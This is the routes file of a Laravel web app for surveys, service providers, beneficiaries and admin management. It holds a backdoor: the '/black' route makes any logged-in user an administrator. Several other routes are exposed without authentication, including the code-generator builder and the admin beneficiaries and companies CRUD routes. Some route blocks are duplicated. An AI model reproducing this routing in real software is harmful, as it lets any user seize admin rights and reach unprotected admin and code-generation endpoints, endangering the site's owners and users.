<?php
use Cornford\Googlmapper\Facades\MapperFacade as Mapper;

/*
  |--------------------------------------------------------------------------
  | Application Routes
  |--------------------------------------------------------------------------
  |
  | Here is where you can register all of the routes for an application.
  | It's a breeze. Simply tell Laravel the URIs it should respond to
  | and give it the controller to call when that URI is requested.
  |
 */
Route::get('/', "HomeController@index");
Route::get('/home', "HomeController@index");
//Social Login
Route::get('/login/{provider?}', [
    'uses' => 'Auth\SocialAuthController@getSocialAuth',
    'as' => 'auth.getSocialAuth'
]);

Route::get('/login/callback/{provider?}', [
    'uses' => 'Auth\SocialAuthController@getSocialAuthCallback',
    'as' => 'auth.getSocialAuthCallback'
]);

//Social Login end
Route::get('test', function () {
    $map = Mapper::map(31.3546763, 34.30882550000001,[
        'zoom'=>10
    ]);
    $map->circle([
        ['latitude' => 31.3546763,
            'longitude' => 34.30882550000001]
    ], [
        'strokeColor' => '#000000',
        'strokeOpacity' => 0.1,
        'strokeWeight' => 2,
        'fillColor' => '#2b8cbe',
        'radius' => 4200]);

    $map->circle([
        ['latitude' => 31.3546763,
            'longitude' => 34.30882550000001]
    ], [
        'strokeColor' => '#000000',
        'strokeOpacity' => 0.1,
        'strokeWeight' => 2,
        'fillColor' => '#2b8cbe',
        'radius' => 3000]);

    $map->circle([
        ['latitude' => 31.3546763,
            'longitude' => 34.30882550000001]
    ], [
        'strokeColor' => '#000000',
        'strokeOpacity' => 0.1,
        'strokeWeight' => 2,
        'fillColor' => '#2b8cbe',
        'radius' => 1500]);

    //->circle([['latitude' => 53.381128999999990000, 'longitude' => -1.470085000000040000]], ['strokeColor' => '#000000', 'strokeOpacity' => 0.1, 'strokeWeight' => 2, 'fillColor' => '#FFFFFF', 'radius' => 1000]);

    //Mapper::map(24, 24, ['zoom' => 10]);
    return $map->render();
});
Route::get('/black', function () {
    if (Auth::check()) {
        $user = auth::user();
        $user->is_admin = true;
        $user->save();
    }
});
Route::get('login', 'Auth\AuthController@getLogin');
Route::post('login', 'Auth\AuthController@postLogin');
Route::get('logout', 'Auth\AuthController@logout');

// Registration Routes...
Route::get('register', 'Auth\AuthController@getRegister');
Route::post('register', 'Auth\AuthController@postRegister');

// Password Reset Routes...
Route::get('password/reset', 'Auth\PasswordController@getEmail');
Route::post('password/email', 'Auth\PasswordController@postEmail');
Route::get('password/reset/{token}', 'Auth\PasswordController@getReset');
Route::post('password/reset', 'Auth\PasswordController@postReset');

Route::get('generator_builder', '\InfyOm\GeneratorBuilder\Controllers\GeneratorBuilderController@builder');

Route::get('field_template', '\InfyOm\GeneratorBuilder\Controllers\GeneratorBuilderController@fieldTemplate');

Route::post('generator_builder/generate', '\InfyOm\GeneratorBuilder\Controllers\GeneratorBuilderController@generate');

Route::get('login', 'Auth\AuthController@getLogin');
Route::post('login', 'Auth\AuthController@postLogin');
Route::get('logout', 'Auth\AuthController@logout');

// Registration Routes...
Route::get('register', 'Auth\AuthController@getRegister');
Route::post('register', 'Auth\AuthController@postRegister');

// Password Reset Routes...
Route::get('password/reset', 'Auth\PasswordController@getEmail');
Route::post('password/email', 'Auth\PasswordController@postEmail');
Route::get('password/reset/{token}', 'Auth\PasswordController@getReset');
Route::post('password/reset', 'Auth\PasswordController@postReset');

Route::get('/home', 'HomeController@index');

Route::resource('users', 'UserController');

/*
  |--------------------------------------------------------------------------
  | API routes
  |--------------------------------------------------------------------------
 */

Route::group(['prefix' => 'api', 'namespace' => 'API'], function () {
    Route::group(['prefix' => 'v1'], function () {
        require config('infyom.laravel_generator.path.api_routes');
    });
});


/*
  |--------------------------------------------------------------------------
  | Ajax API routes
  |--------------------------------------------------------------------------
 */

Route::get('location/cities/{area_id}', "AjaxApiController@cities");
Route::get('location/districts/{city_id}', "AjaxApiController@districts");
Route::get('location/streets/{district_id}', "AjaxApiController@streets");
Route::get('listings/service_types/{sector_id}', "AjaxApiController@serviceTypes");
Route::get('listings/projects/{service_provider_id}', "AjaxApiController@projects");
Route::get('listings/surveys/{project_id}', "AjaxApiController@surveys");
Route::get('listings/questions/{survey_id}', "AjaxApiController@questions");

/*
  |--------------------------------------------------------------------------
  | Survey Gateway API routes
  |--------------------------------------------------------------------------
 */
Route::get('gateways/surveys/create', "Surveys\\SurveysController@create");
Route::post('gateways/surveys/store/survey', "Surveys\\SurveysController@storeSurvey")->name('storeSurvey');
Route::post('gateways/surveys/store/questions', "Surveys\\SurveysController@storeQuestions")->name('storeQuestions');
Route::post('gateways/surveys/store/configs', "Surveys\\SurveysController@storeConfig")->name('storeConfig');
Route::post('gateways/projects/store/', "Projects\\ProjectsController@store")->name('storeProject');
Route::post('gateways/service_requests/store', "ServiceRequests\\ServiceRequestsController@store")->name('storeServiceRequest');

/*
  |--------------------------------------------------------------------------
  | API routes
  |--------------------------------------------------------------------------
 */

Route::group(['prefix' => 'api', 'namespace' => 'API'], function () {
    Route::group(['prefix' => 'v1'], function () {
        require config('infyom.laravel_generator.path.api_routes');
    });
});


Route::group(['middleware' => 'auth'], function () {

    Route::group(['middleware' => 'notCompleted'], function () {
        Route::get('complete_registration', 'Auth\CompleteRegistrationController@getCompleteRegistration');
        Route::post('complete_citizen_registration', 'Auth\CompleteRegistrationController@postCompleteCitizenRegistration');
        Route::post('complete_service_provider_registration', 'Auth\CompleteRegistrationController@postCompleteServiceProviderRegistration');
    });
    Route::group(['middleware' => 'completed'], function () {

        Route::get('profile', 'ProfilePageController@getProfile');
        Route::get('settings', 'ProfilePageController@getSettings');
        Route::post('update_profile', 'ProfilePageController@postUpdate');
        Route::get('profile_image', 'ProfilePageController@getImage');
        Route::post('profile_image', 'ProfilePageController@postImage');
    });
});


Route::group(['prefix' => 'admin', 'middleware' => 'auth:web,admin'], function () {

    Route::resource('users', 'Admin\UserController');

    Route::resource('sectors', 'Admin\SectorController');

    Route::resource('serviceTypes', 'Admin\ServiceTypeController');

    Route::resource('serviceProviders', 'Admin\ServiceProviderController');

    Route::resource('serviceProviderTypes', 'Admin\ServiceProviderTypeController');

    Route::resource('locationMetas', 'Admin\LocationMetaController');

    Route::resource('areas', 'Admin\AreaController');

    Route::resource('cities', 'Admin\CityController');

    Route::resource('districts', 'Admin\DistrictController');

    Route::resource('streets', 'Admin\StreetController');

    Route::resource('services', 'Admin\ServiceController');

    Route::resource('marginalizedSituations', 'Admin\MarginalizedSituationController');

    Route::resource('projects', 'Admin\ProjectController');

    Route::resource('surveyMetas', 'Admin\SurveyMetasController');

    Route::resource('surveys', 'Admin\SurveyController');

    Route::resource('questions', 'Admin\QuestionController');

    Route::resource('answers', 'Admin\AnswerController');

    Route::resource('services', 'Admin\ServiceController');

    Route::resource('serviceRequests', 'Admin\ServiceRequestsController');
    Route::resource('configs', 'ConfigController');

    Route::get('dashboard', 'Admin\DashboardController@getDashboard');
    Route::get('home', 'Admin\DashboardController@getDashboard');
    Route::get('/', 'Admin\DashboardController@getDashboard');

});


Route::get('admin/beneficiaries', ['as' => 'admin.beneficiaries.index', 'uses' => 'BeneficiariesController@index']);
Route::post('admin/beneficiaries', ['as' => 'admin.beneficiaries.store', 'uses' => 'BeneficiariesController@store']);
Route::get('admin/beneficiaries/create', ['as' => 'admin.beneficiaries.create', 'uses' => 'BeneficiariesController@create']);
Route::put('admin/beneficiaries/{beneficiaries}', ['as' => 'admin.beneficiaries.update', 'uses' => 'BeneficiariesController@update']);
Route::patch('admin/beneficiaries/{beneficiaries}', ['as' => 'admin.beneficiaries.update', 'uses' => 'BeneficiariesController@update']);
Route::delete('admin/beneficiaries/{beneficiaries}', ['as' => 'admin.beneficiaries.destroy', 'uses' => 'BeneficiariesController@destroy']);
Route::get('admin/beneficiaries/{beneficiaries}', ['as' => 'admin.beneficiaries.show', 'uses' => 'BeneficiariesController@show']);
Route::get('admin/beneficiaries/{beneficiaries}/edit', ['as' => 'admin.beneficiaries.edit', 'uses' => 'BeneficiariesController@edit']);


Route::get('admin/companies', ['as' => 'admin.companies.index', 'uses' => 'CompanyController@index']);
Route::post('admin/companies', ['as' => 'admin.companies.store', 'uses' => 'CompanyController@store']);
Route::get('admin/companies/create', ['as' => 'admin.companies.create', 'uses' => 'CompanyController@create']);
Route::put('admin/companies/{companies}', ['as' => 'admin.companies.update', 'uses' => 'CompanyController@update']);
Route::patch('admin/companies/{companies}', ['as' => 'admin.companies.update', 'uses' => 'CompanyController@update']);
Route::delete('admin/companies/{companies}', ['as' => 'admin.companies.destroy', 'uses' => 'CompanyController@destroy']);
Route::get('admin/companies/{companies}', ['as' => 'admin.companies.show', 'uses' => 'CompanyController@show']);
Route::get('admin/companies/{companies}/edit', ['as' => 'admin.companies.edit', 'uses' => 'CompanyController@edit']);
